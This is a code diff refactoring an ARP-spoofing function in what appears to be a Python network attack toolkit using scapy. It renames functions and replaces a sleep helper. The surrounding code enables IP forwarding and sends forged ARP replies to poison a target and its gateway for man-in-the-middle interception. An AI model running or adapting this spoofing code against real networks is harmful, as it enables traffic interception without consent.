@@ -1,12 +1,12 @@
 """     libs       """
 # external
 from scapy.all import sendp, ARP, Ether
+from time import sleep
 
 # internal
 from lib.GPL.attackers.network.IP_To_MAC import gpl_ip_to_mac
 from lib.GPL.attackers.network.IP_Exists import gpl_ipv4_icmp_exists_check
 from lib.GPL.attackers.network.IP_Forwarding import gpl_set_ipv4_forward_state
-from lib.GPL.IO import gpl_sleep
 from lib.core.Error_Handler import Handler
 import lib.config.Error_Levels as Error_Levels
 from lib.config.GPL import ARP_Spoof_Resend_Sleep
@@ -36,7 +36,7 @@ def gpl_arp_spoof_fake_once(Target_IP, Target_MAC, Gateway_IP):
 #
 # version
 # 1
-def gpl_arp_spoof_end_request():
+def gpl_arp_spoof_end_attack_thread():
     global ARP_SPOOF_RUN
     ARP_SPOOF_RUN = False
 
@@ -52,7 +52,7 @@ def gpl_arp_spoof_end_request():
 #
 # version
 # 1
-def gpl_arp_spoof(target_IP, gateway_IP, ignore_IP_exists_check=False, print_log=False):
+def gpl_arp_spoof_thread(target_IP, gateway_IP, ignore_IP_exists_check=False, print_log=False):
     global ARP_SPOOF_RUN
     try:
         gpl_set_ipv4_forward_state(True)
@@ -68,7 +68,7 @@ def gpl_arp_spoof(target_IP, gateway_IP, ignore_IP_exists_check=False, print_log
                 gpl_arp_spoof_fake_once(target_IP, Target_MAC, gateway_IP)
                 # gatewat -> hacker -> target
                 gpl_arp_spoof_fake_once(gateway_IP, Gateway_MAC, target_IP)
-                gpl_sleep(ARP_Spoof_Resend_Sleep, manage_ctrl_C_and_exit=False)
+                sleep(ARP_Spoof_Resend_Sleep)
             ARP_SPOOF_RUN = True
         else:
             return None
